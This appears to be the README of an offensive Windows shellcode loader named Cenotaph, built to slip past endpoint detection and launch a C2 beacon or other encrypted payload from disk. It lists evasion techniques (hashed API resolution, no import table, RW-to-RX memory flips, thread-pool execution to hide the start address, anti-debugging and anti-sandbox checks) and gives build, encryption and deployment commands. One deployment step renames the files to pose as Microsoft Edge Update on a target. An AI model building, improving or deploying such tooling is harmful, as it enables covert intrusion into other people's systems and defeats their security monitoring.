# Cenotaph — EDR-fit disk host / fallback shellcode loader

> **Full reference:** [`docs/Cenotaph.md`](docs/Cenotaph.md) — architecture,
> threat model, module reference, audit, live-test plan, troubleshooting.
> This README is the quickstart.

Cenotaph is a small (~7 KB) native x64 Windows PE that launches an encrypted
shellcode payload from a sibling file on disk. It is built as a **simple
fallback loader** for when in-memory injection is not an option: drop a bland
`.exe` + matching `.dat` on disk and run.

It is equally useful for launching the NaX beacon or any other x64 shellcode:
the `.dat` file is encrypted with ChaCha20 + HMAC-SHA256, and the key is
embedded XOR-obfuscated in the binary.

## What makes it state-of-the-art / OPSEC-safe

1. **Zero IAT imports.** Every API is resolved at runtime via a PEB walk with
   FNV1a-32 hashes. The binary has no import table entries at all.
2. **Encrypted payload.** The on-disk `.dat` is `nonce(12) || ciphertext ||
   hmac(32)`. Cenotaph verifies HMAC-SHA256 over `nonce || ciphertext`, then
   decrypts with ChaCha20 IETF (counter starts at 1).
3. **No RWX.** Payload memory is allocated RW, decrypted into it, then flipped
   RX (`PAGE_EXECUTE_READ`) — never `PAGE_EXECUTE_READWRITE`.
4. **No API name strings.** All API names are compile-time FNV1a immediates.
5. **Thread-pool hand-off.** Execution is transferred via `TpAllocWork` /
   `TpPostWork` / `TpReleaseWork`, so the worker thread's start address is
   `ntdll!TppWorkerThread`, not a private allocation. Direct-call fallback is
   used if the pool allocation fails.
6. **Fail-closed anti-analysis:** debugger flag, `NtGlobalFlag`, process-heap
   debug flags, CPU count, uptime, and RDTSC timing check.
7. **No AMSI / ETW patching.**

---

## Repository layout

```
Cenotaph/
├── include/
│   ├── Cenotaph.h      types, hash constants, full x64 PEB/LDR structs, INSTANCE
│   ├── CenKey.h        generated embedded key placeholder (regenerate before staging)
│   └── Constexpr.h     compile-time FNV1a (HASH_STR -> immediate, no name strings)
├── src/
│   ├── Ldr.c           PEB walk + export-table resolution (adapted from NaX)
│   ├── Utils.c         FNV1a-32 HashString (verbatim NaX logic — load-bearing)
│   └── Host.c          entry: resolve → sandbox → read → HMAC verify → decrypt → RX → run
├── scripts/
│   └── validate.py     static scanner (zero imports, API strings, RWX, undefineds)
├── tools/
│   ├── hash.py         FNV1a verifier (reproduces every constant Cenotaph uses)
│   └── encrypt.py      encrypt a payload into the Cenotaph .dat format + emit CenKey.h
├── Makefile            mingw cross-build + `make audit`
└── docs/
    └── Cenotaph.md      full reference
```

---

## Build

Cross-compiled on Linux with mingw-w64 (`x86_64-w64-mingw32-g++`).

```bash
make            # cenotaph.exe       (release, windows subsystem, stripped, ~7 KB)
make debug      # cenotaph-debug.exe (console subsystem, sandbox check disabled)
make audit      # zero-import + API-string + undefined-symbol checks
make clean
```

No CRT is linked (`-nostdlib`, explicit entry `CenotaphEntry`). No import libs
are linked. Every API is resolved at runtime via the PEB walk.

### Audit gates (`make audit`)

1. **Zero imports** — `objdump -p` must show an empty import table.
2. **API-name string scan** — `strings | grep -iE 'NtAllocate|NtProtect|…'`
   must be **empty** (all APIs are FNV1a hashes).
3. **Undefined symbols** — `nm -u` empty (no CRT, no bare libc).
4. **Entry-point disasm** — FNV1a hashes appear as **immediates**
   (`0x318a7963` ntdll, `0x04a1a06a` kernel32, `0xd58d5a18`
   `NtAllocateVirtualMemory`, `0x626981af` `TpAllocWork`, …); `gs:0x60` PEB read
   in `LdrModulePeb`; `TpAllocWork`/`TpPostWork`/`TpReleaseWork` +
   `NtDelayExecution` tail. `tools/hash.py` reproduces every constant.

---

## Prepare a payload

```bash
# Encrypt any x64 shellcode / beacon for Cenotaph.
# This writes the matching key into include/CenKey.h and the encrypted blob to
# the .dat path you specify.
python3 tools/encrypt.py --payload nax.x64.bin --dat cenotaph.dat \
                         --header include/CenKey.h

# Rebuild the loader so it embeds the same key.
make clean && make

# Audit the result
make audit
python3 scripts/validate.py cenotaph.exe
```

If you already generated a key and only want to encrypt another payload with the
same key:

```bash
python3 tools/encrypt.py --payload other.x64.bin --dat other.dat --keep-header
```

---

## Deploy / use

1. Build the loader and encrypt your payload:
   ```bash
   python3 tools/encrypt.py --payload nax.x64.bin --dat cenotaph.dat --header include/CenKey.h
   make
   ```
2. On target, rename the pair to a bland combination, e.g.
   `MicrosoftEdgeUpdate.exe` + `MicrosoftEdgeUpdate.dat`. Place them in the same
   directory.
3. Run the exe. Sandbox check → read `.dat` → HMAC verify → ChaCha20 decrypt →
   RX allocation → thread-pool execution.

The `.dat` payload file is **never committed** (`.gitignore`); it is staged on
the target. `include/CenKey.h` contains a placeholder zero key for the repo so
`make` builds out of the box, but you **must regenerate it** with
`tools/encrypt.py` before any real staging.

---

## When to use Cenotaph

- As a **fallback** when in-memory injection / module stomp is blocked or noisy.
- As a **disk-based bootstrap** for the NaX beacon (encrypt `nax.x64.bin`).
- As a **generic encrypted shellcode loader** for any x64 PIC payload.

Cenotaph intentionally does **not** do network staging, process hollowing, or
AMSI/ETW patching. Those tasks are handled by other projects in this repo
(`hostpayload_v2`, `NaX/src_loader_adv`, `remote_bof_loader`).
